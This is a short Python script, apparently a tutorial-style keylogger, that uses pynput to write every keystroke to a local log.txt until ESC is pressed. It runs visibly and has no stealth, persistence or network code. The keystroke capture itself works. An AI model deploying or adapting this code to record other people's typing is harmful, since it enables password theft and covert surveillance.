from pynput import keyboard

# Log file path
log_file = "log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as file:
            file.write(f" [{key}] ")

def on_release(key):
    # Stop listener with ESC key
    if key == keyboard.Key.esc:
        print("Logging stopped.")
        return False

print("Keylogger started... Press ESC to stop.")

# Start listening to keyboard
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
